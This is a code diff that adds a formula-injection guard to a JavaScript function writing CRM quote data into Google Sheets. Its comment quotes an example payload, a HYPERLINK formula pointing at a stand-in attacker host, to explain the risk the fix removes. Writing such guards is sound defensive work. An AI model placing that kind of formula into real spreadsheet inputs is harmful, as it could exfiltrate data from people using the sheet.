@@ -55,19 +55,34 @@ export async function appendQuoteToCrm(input = {}) {
   }
 
   try {
+    // CSV injection guard: Sheets `valueInputOption: USER_ENTERED` interprets
+    // values starting with =, +, -, @, tab, or carriage return as formulas.
+    // A malicious customer name like `=HYPERLINK("http://evil.com")` could
+    // exfiltrate data when the sheet recalculates. Prefix unsafe leading
+    // chars with an apostrophe so Sheets treats them as literal text.
+    // (Cursor security finding.)
+    const sanitize = (s) => {
+      const v = String(s || "");
+      if (!v) return "";
+      const first = v.charAt(0);
+      if (first === "=" || first === "+" || first === "-" || first === "@" || first === "\t" || first === "\r") {
+        return "'" + v;
+      }
+      return v;
+    };
     const now = new Date().toISOString();
-    const cliente = String(input.cliente || "").trim() || "—";
-    const telefono = String(input.telefono || "").trim();
-    const ubicacion = String(input.ubicacion || "").trim();
+    const cliente = sanitize(String(input.cliente || "").trim() || "—");
+    const telefono = sanitize(String(input.telefono || "").trim());
+    const ubicacion = sanitize(String(input.ubicacion || "").trim());
     const scenario = String(input.scenario || "").trim();
     const lista = String(input.lista || "").trim();
     const total = Number(input.total || 0);
-    const pdfUrl = String(input.pdf_url || "").trim();
-    const driveUrl = String(input.drive_url || "").trim();
-    const vendedor = String(input.vendedor || "").trim();
-    const tipoCliente = String(input.tipo_cliente || "").trim();
-    const urgencia = String(input.urgencia || "").trim();
-    const probabilidad = String(input.probabilidad_cierre || "").trim();
+    const pdfUrl = sanitize(String(input.pdf_url || "").trim());
+    const driveUrl = sanitize(String(input.drive_url || "").trim());
+    const vendedor = sanitize(String(input.vendedor || "").trim());
+    const tipoCliente = sanitize(String(input.tipo_cliente || "").trim());
+    const urgencia = sanitize(String(input.urgencia || "").trim());
+    const probabilidad = sanitize(String(input.probabilidad_cierre || "").trim());
 
     const resumenPedido = [
       scenario ? `[${scenario}]` : "",
@@ -80,7 +95,10 @@ export async function appendQuoteToCrm(input = {}) {
       pdfUrl ? `PDF: ${pdfUrl}` : "",
       driveUrl ? `Drive: ${driveUrl}` : "",
     ].filter(Boolean).join(" | ");
-    const observaciones = [obsBase, obsLinks].filter(Boolean).join(" — ");
+    // Apostrophe-prefix the composite observaciones too — `obsBase` is
+    // operator-controlled and could start with `=`/`+`/`-`/`@` even though
+    // the prefixed component strings don't.
+    const observaciones = sanitize([obsBase, obsLinks].filter(Boolean).join(" — "));
 
     // Find first empty row in C4:C500 (Cliente column)
     const existing = await sheets.spreadsheets.values.get({
